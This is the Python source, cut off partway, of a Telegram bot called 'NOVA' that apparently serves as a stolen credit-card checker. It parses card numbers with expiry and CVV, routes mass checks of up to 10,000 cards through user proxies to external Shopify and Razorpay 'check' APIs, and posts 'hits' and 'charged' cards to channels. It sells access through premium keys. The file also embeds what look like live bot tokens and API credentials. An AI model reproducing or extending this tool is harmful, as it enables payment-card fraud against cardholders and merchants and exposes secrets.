# =============================================================================
# NOVA Bot — Complete Single-File Source (v4.2.0)
# =============================================================================
# Changelog v4.2.0 (from v4.0.1):
#   - SHOPIFY_API_URL default set to your working API (f49a)
#   - _proxy_str_for_api() URL-encodes credentials (passwords with :/@ safe)
#   - classify_shopify() reads 'Gate' field (API compat)
#   - classify_shopify() propagates 'retryable' from API
#   - check_card_with_retry() honors API retryable flag
#   - Compact force-join message
#   - Force-join checks BOTH channel AND group strictly (no silent bypass)
#   - /fb locked to Premium + Admin (with media validation)
#   - New admin command: /api (API health check)
# =============================================================================

import os
import re
import json
import time
import random
import string
import logging
import asyncio
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List

import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# ====================== LOGGING ======================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt); log.addHandler(_ch)
try:
    _fh = logging.FileHandler('nova_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt); log.addHandler(_fh)
except Exception:
    pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1003902938287

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

# Channel ID for force-join (must match CHANNEL_INVITE_LINK)
CHANNEL_CHAT_ID = -1003965573664

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"
SEP          = "━━━━━━━━━━━━━━━━━"
PE           = "💎"

# ★★★ API endpoints ★★★
SHOPIFY_API_URL  = os.getenv("SHOPIFY_API_URL",
    "https://shopify-api-production-f49a.up.railway.app/check")
RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL",
    "https://web-production-43fc5.up.railway.app/check")
RAZORPAY_ENABLED = os.getenv("RAZORPAY_ENABLED", "false").lower() == "true"

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

MIN_PRODUCT_PRICE = 0.50
MAX_PRODUCT_PRICE = 5.00

MASS_HARD_CAP_ADMIN   = 10000
MASS_HARD_CAP_PREMIUM = 5000

PREMIUM_USERS_FILE = "premium_users.json"
USER_PROXIES_FILE  = "user_proxies.json"
KEYS_FILE          = "keys.json"
SITES_FILE         = "sites.txt"
RANK_FILE          = "rank.json"
SETTINGS_FILE      = "settings.json"
PREMIUM_DAILY_FILE = "premium_daily.json"
USER_LIMITS_FILE   = "user_daily_limits.json"


# ====================== WORKER COUNTS ======================
SP_PER_USER_WORKERS    = 50
MSP_PER_USER_WORKERS   = 50
RZ_PER_USER_WORKERS    = 30
MRZ_PER_USER_WORKERS   = 20
SITE_PER_USER_WORKERS  = 20
PROXY_PER_USER_WORKERS = 25


# ====================== PREMIUM EMOJI ======================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🥈":"5042036407137207122","🥉":"5039808285478224750","🥔":"5039928501612839813",
    "🧨":"5039778134807806727","🏆":"6089185885289454318","👑":"5039727497143387500",
    "👤":"5992129361090711368","🤖":"6174896506051495705","⚙️":"5445059250382469069",
    "🌐":"6321225560789877992","ℹ️":"5334544901428229844","🏳️":"5256143829672672750",
    "📍":"5391032818111363540","📡":"5447448489149625830","🔔":"5042111805288089118",
    "🛡":"5042328396193864923","🛡️":"5042328396193864923","🔑":"5399885604701880145",
    "🔒":"5445059250382469069","🔓":"5445373981290952548","🔗":"5042101437237036298",
    "🔐":"5445059250382469069","⏰":"5445350406215465190","⏱️":"5445350406215465190",
    "⏱":"5445350406215465190","⌛":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "💠":"5427168083074628963","🌍":"5447410659077661506","🔰":"5042328396193864923",
    "📧":"5443127283898405358","💀":"5042209657527993345","💯":"5042297717242463211",
    "🚫":"5039671744172917707","😈":"6336664426325740768","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","🟡":"5042036407137207122","🔵":"5042290883949495533",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⏸":"5042036407137207122","▶️":"5039753786638205957","⏹":"5134537521518085000",
    "🧹":"5039751080808809534","📌":"5397782960512444700","📋":"5445260044398524944",
    "🔧":"5445059250382469069","🔍":"5042302287087666158","💻":"5039579582764680065",
    "📩":"5443127283898405358","💬":"5040036030414062506","📢":"5447644880824181073",
    "📣":"5447644880824181073","💡":"5042264341051605743","🛒":"5445224894386172410",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏠":"5416041192905265756",
    "🏙️":"5447410659077661506","📞":"5443127283898405358","📮":"5444889156792646660",
    "🗺️":"6321225560789877992","↪️":"5445365692004071819","🔙":"5445365692004071819",
    "⬅️":"5445365692004071819","➡️":"5445365692004071819","🎀":"5039953030171067177",
    "🎊":"5039778134807806727","🌟":"5042061201983407048","🔀":"5348386034835015762",
    "🎬":"5445355530111437729","🧠":"6174896506051495705","🖥️":"5039579582764680065",
    "💾":"6026239398650056451","💿":"6026239398650056451","🏓":"5042200814190330758",
    "🎁":"5039778134807806727","🎈":"5039778134807806727","🎨":"5039953030171067177",
    "🌸":"5039953030171067177","🍀":"5039928501612839813","🌙":"5042200814190330758",
    "☀️":"5039808285478224750","🌈":"5256143829672672750","👥":"5443038326535759644",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji in sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True):
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# ====================== MESSAGE HELPERS ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities,
                                         buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except Exception:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


async def send_entities(chat_id, html_text, buttons=None, file=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=ents,
            buttons=buttons, link_preview=False, **kwargs)
    except Exception as e:
        log_system("SEND", f"send_entities failed: {e}", "error")
        return None


async def send_file_entities(chat_id, file, html_caption, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(
            chat_id, file, caption=text, formatting_entities=ents,
            buttons=buttons, **kwargs)
    except Exception as e:
        log_system("SEND_FILE", f"send_file_entities failed: {e}", "error")
        return None


async def edit_entities(msg, html_text, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        await msg.edit(text, formatting_entities=ents,
                       buttons=buttons, link_preview=False, **kwargs)
        return True
    except Exception:
        return False


# ====================== BUTTON HELPER ======================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
    "📢":"5447644880824181073","👥":"5443038326535759644","📩":"5443127283898405358",
    "💬":"5040036030414062506","🥇":"6179279816529814743","🥈":"5042036407137207122",
    "🥉":"5039808285478224750","🥔":"5039928501612839813","🧨":"5039778134807806727",
    "🟢":"5039928501612839813","🔵":"5042290883949495533","🟡":"5042036407137207122",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⛔":"6181277564732972292","🛑":"6181277564732972292","🚨":"5039671744172917707",
    "🎯":"5039905162760553480","📊":"5042290883949495533","📈":"5039808285478224750",
    "🏆":"6089185885289454318","👤":"5992129361090711368","📌":"5397782960512444700",
    "🔍":"5042302287087666158","🔧":"5445059250382469069","💡":"5042264341051605743",
    "📝":"5444889156792646660","🗑":"5039614900280754969","📅":"6168242008277125889",
    "🧹":"5039751080808809534","🎉":"5039778134807806727","✨":"5040016479722931047",
    "✔️":"5206607081334906820","🔒":"5445059250382469069","🔐":"5445059250382469069",
    "🌍":"5447410659077661506","📍":"5391032818111363540","🎬":"5445355530111437729",
    "🎀":"5039953030171067177","🎊":"5039778134807806727","🌟":"5042061201983407048",
    "💯":"5042297717242463211","😈":"6336664426325740768","💀":"5042209657527993345",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏦":"6089185885289454318",
    "💵":"5409048419211682843","💸":"5837027045376271166","💲":"5447579253723918909",
    "⏱️":"5445350406215465190","⏱":"5445350406215465190","⌛":"5445350406215465190",
    "📤":"5445355530111437729","🔗":"5042101437237036298","💠":"5427168083074628963",
    "🔮":"5042302287087666158","🔀":"5348386034835015762",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# ====================== JSON STORAGE ======================
def _read_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def _write_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        log_system("FS", f"write {path} failed: {e}", "error")


def load_premium_users() -> dict:
    data = _read_json(PREMIUM_USERS_FILE, None)
    if data is None:
        data = {str(uid): None for uid in ADMIN_ID}
        _write_json(PREMIUM_USERS_FILE, data)
    return data


def save_premium_users(data: dict):
    _write_json(PREMIUM_USERS_FILE, data)


def is_premium(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return False
    expiry = data[uid]
    if expiry is None:
        return True
    info = expiry
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp is None:
            return True
        if datetime.now().timestamp() > float(exp):
            del data[uid]
            save_premium_users(data)
            return False
        return True
    if datetime.now().timestamp() > float(info):
        del data[uid]
        save_premium_users(data)
        return False
    return True


def add_premium(user_id: int, expiry_ts=None, cc_limit=None):
    data = load_premium_users()
    if expiry_ts is None and cc_limit is None:
        data[str(user_id)] = None
    else:
        data[str(user_id)] = {"expiry": expiry_ts, "cc_limit": cc_limit or 100000,
                              "activated_at": datetime.now().isoformat()}
    save_premium_users(data)


def remove_premium(user_id: int) -> bool:
    data = load_premium_users()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_users(data)
        return True
    return False


def get_cc_limit(user_id: int) -> int:
    if user_id in ADMIN_ID:
        return 100000
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return 0
    info = data[uid]
    if info is None:
        return 100000
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp and datetime.now().timestamp() > float(exp):
            return 0
        return int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT))
    return 100000


def load_user_proxies(user_id: int) -> list:
    data = _read_json(USER_PROXIES_FILE, {})
    return data.get(str(user_id), [])


def save_user_proxies(user_id: int, proxies: list):
    data = _read_json(USER_PROXIES_FILE, {})
    data[str(user_id)] = proxies
    _write_json(USER_PROXIES_FILE, data)


def load_sites() -> list:
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_sites(sites: list):
    try:
        with open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save sites failed: {e}", "error")


def load_keys() -> dict:
    return _read_json(KEYS_FILE, {})


def save_keys(keys: dict):
    _write_json(KEYS_FILE, keys)


def generate_key() -> str:
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


def load_rank() -> dict:
    return _read_json(RANK_FILE, {})


def save_rank(data: dict):
    _write_json(RANK_FILE, data)


def increment_charge_count(user_id: int):
    data = load_rank()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + 1
    save_rank(data)


def load_settings() -> dict:
    return _read_json(SETTINGS_FILE, {
        "maintenance": False,
        "threshold": MAX_PRODUCT_PRICE,
        "min_price": MIN_PRODUCT_PRICE,
    })


def save_settings(data: dict):
    _write_json(SETTINGS_FILE, data)


def get_maintenance() -> bool:
    return bool(load_settings().get("maintenance", False))


def set_maintenance(enabled: bool):
    s = load_settings()
    s["maintenance"] = bool(enabled)
    save_settings(s)


def get_threshold() -> float:
    return float(load_settings().get("threshold", MAX_PRODUCT_PRICE))


def set_threshold(val: float):
    s = load_settings()
    s["threshold"] = float(val)
    save_settings(s)


def get_min_price() -> float:
    return float(load_settings().get("min_price", MIN_PRODUCT_PRICE))


def set_min_price(val: float):
    s = load_settings()
    s["min_price"] = float(val)
    save_settings(s)


# ====================== PREMIUM DAILY / USER LIMITS ======================
def load_premium_daily():
    return _read_json(PREMIUM_DAILY_FILE, {})


def save_premium_daily(d):
    _write_json(PREMIUM_DAILY_FILE, d)


def get_premium_daily_used(uid):
    d = load_premium_daily()
    e = d.get(str(uid), {})
    if e.get("date") != datetime.now().strftime("%Y-%m-%d"):
        return 0
    return e.get("count", 0)


def inc_premium_daily_used(uid):
    d = load_premium_daily()
    u = str(uid)
    today = datetime.now().strftime("%Y-%m-%d")
    e = d.get(u, {})
    if e.get("date") != today:
        e = {"date": today, "count": 1}
    else:
        e["count"] = e.get("count", 0) + 1
    d[u] = e
    save_premium_daily(d)


def get_premium_daily_limit(uid):
    lim = _read_json(USER_LIMITS_FILE, {})
    return int(lim.get(str(uid), 0))


# ====================== UTILITIES ======================
def extract_cc(text: str) -> list:
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url: str) -> bool:
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def normalize_site_url(url: str) -> str:
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def extract_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy: str):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


# ====================== HTTP SESSIONS ======================
_GLOBAL_HTTP = None
_GLOBAL_BIN  = None
_GLOBAL_PROXY= None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=10),
            connector=aiohttp.TCPConnector(
                limit=500, limit_per_host=200,
                ttl_dns_cache=600, use_dns_cache=True,
                enable_cleanup_closed=True,
            ),
        )
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30, connect=20),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_PROXY


# ====================== PER-USER SEMAPHORES ======================
_USER_SEMS = {}


def get_user_sem(uid, t="msp"):
    key = (uid, t)
    sem = _USER_SEMS.get(key)
    if sem is None:
        limits = {
            "sp": 50, "msp": 50, "rz": 30, "mrz": 20,
            "proxy": 25, "site": 20,
        }
        sem = asyncio.Semaphore(limits.get(t, 20))
        _USER_SEMS[key] = sem
    return sem


def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k[0] == uid]:
        _USER_SEMS.pop(k, None)


async def get_user_http_session(uid, purpose="general"):
    return await get_http_session()


async def cleanup_user_http_session(uid, purpose="general"):
    pass


# ====================== EXTRAS ======================
class SmartRotator:
    def __init__(self):
        self._sf, self._pf = {}, {}

    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude] or sites
        return random.choice(available) if available else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        available = [p for p in proxies if p not in exclude] or proxies
        return random.choice(available) if available else None

    def report_site_ok(self, s):   pass
    def report_site_fail(self, s): pass
    def report_proxy_ok(self, p):  pass
    def report_proxy_fail(self, p):pass


def is_site_error(t):
    if not t:
        return False
    tl = str(t).lower().strip()
    dead_markers = [
        "shop not found", "store not found", "site not found",
        "invalid site", "invalid store", "no such shop",
        "domain not found", "could not resolve", "dns error",
        "store is unavailable", "shop is unavailable",
        "this store is unavailable", "this shop is currently unavailable",
        "currently unavailable", "store closed", "shop closed",
        "storefront is password protected", "password protected",
    ]
    return any(k in tl for k in dead_markers)


def is_proxy_error(t):
    if not t:
        return False
    tl = str(t).lower()
    keys = ["proxy", "407", "tunnel", "connection reset", "socks",
            "proxy_required", "proxy required", "proxy_invalid"]
    return any(k in tl for k in keys)


def is_rz_retry_error(t):
    if not t:
        return True
    tl = str(t).lower()
    keys = ["timeout", "retry", "error", "failed", "502", "503", "504"]
    return any(k in tl for k in keys)


def is_truly_alive(r, p):
    return True


def rz_clean_response(r):
    return r


_BIN_CACHE = {}


async def get_bin_info_cached(card_number, session):
    cn = card_number[:6] if card_number else ''
    if not cn or len(cn) < 6:
        return ('-', '-', '-', '-', '-', '')
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    try:
        url = f"https://lookup.binlist.net/{cn}"
        headers = {'Accept-Version': '3'}
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                scheme = data.get('scheme', '-') or '-'
                typ = data.get('type', '-') or '-'
                brand = data.get('brand', '-') or '-'
                bank = (data.get('bank') or {}).get('name', '-') or '-'
                country = (data.get('country') or {}).get('name', '-') or '-'
                flag = (data.get('country') or {}).get('emoji', '') or ''
                result = (scheme.upper(), typ.upper(), brand.upper(), bank, country, flag)
                _BIN_CACHE[cn] = result
                return result
    except Exception:
        pass
    return ('-', '-', '-', '-', '-', '')


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n💎 <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime_sec = time.time() - BOT_START_TIME
        h, m, s = int(uptime_sec // 3600), int((uptime_sec % 3600) // 60), int(uptime_sec % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
💻 CPU: <code>{cpu}%</code>
🧠 RAM: <code>{mem.percent}%</code> ({mem.used // (1024**2)}MB / {mem.total // (1024**2)}MB)
💾 Disk: <code>{disk.percent}%</code>
⏰ Uptime: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


# ====================== FORCE-JOIN (STRICT + COMPACT) ======================
_JOIN_CACHE = {}
_JOIN_CACHE_TTL = 600  # 10 minutes

# Chats the user MUST be a member of
FORCE_JOIN_CHATS = [
    (GROUP_CHAT_ID,   "Group",   GROUP_INVITE_LINK),
    (CHANNEL_CHAT_ID, "Channel", CHANNEL_INVITE_LINK),
]


async def _is_in_chat(user_id: int, chat_id: int):
    """Returns True (member), False (not member), None (cannot verify)."""
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (
        UserNotParticipantError, ChannelPrivateError,
        ChatAdminRequiredError, UserIdInvalidError,
    )
    if not chat_id:
        return None
    try:
        await client_instance(GetParticipantRequest(channel=chat_id, participant=user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChannelPrivateError, ChatAdminRequiredError):
        log_system("FORCE_JOIN", f"bot cannot verify chat {chat_id}", "warning")
        return None
    except UserIdInvalidError:
        return False
    except Exception as e:
        log_system("FORCE_JOIN", f"unexpected error chat {chat_id}: {e!r}", "warning")
        return None


async def is_user_joined(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached_at = _JOIN_CACHE.get(user_id)
    if cached_at and now - cached_at < _JOIN_CACHE_TTL:
        return True
    for chat_id, _name, _link in FORCE_JOIN_CHATS:
        result = await _is_in_chat(user_id, chat_id)
        if result is False:
            return False
    _JOIN_CACHE[user_id] = now
    return True


async def send_join_required_message(event):
    rows = []
    for _cid, name, link in FORCE_JOIN_CHATS:
        if link:
            rows.append([pbtn(bs(f"📢 Join {name}"), url=link,
                              style="primary", icon="📢")])
    rows.append([pbtn(bs("✅ I Joined"), data="check_joined",
                      style="success", icon="✅")])
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
💎 {bs('Join both chats to continue')}
{SEP}""")
    await styled_reply(event, text, buttons=rows)


async def force_join_check(event) -> bool:
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    await send_join_required_message(event)
    return False


async def check_maintenance(event) -> bool:
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
💎 <b>{bs('Bot under maintenance')}</b>
💎 <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
💎 {bs('This command requires premium access')}
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
